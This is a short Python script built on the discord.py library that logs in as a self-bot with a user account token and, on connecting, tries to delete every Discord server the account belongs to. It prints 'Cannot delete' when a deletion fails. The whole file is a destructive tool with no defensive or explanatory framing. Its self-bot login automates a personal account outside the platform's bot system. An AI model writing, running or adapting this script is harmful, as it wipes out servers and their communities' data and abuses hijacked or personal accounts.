import discord
from discord.ext import commands, tasks





client = discord.Client()   
client= commands.Bot(command_prefix="none", self_bot=True)
client.remove_command("help")
token = "token here"






@client.event
async def on_connect():
    for guild in client.guilds:
        try: 
             await guild.delete()
        except:
            print("Cannot delete")

client.run(token, reconnect=True, bot=False)
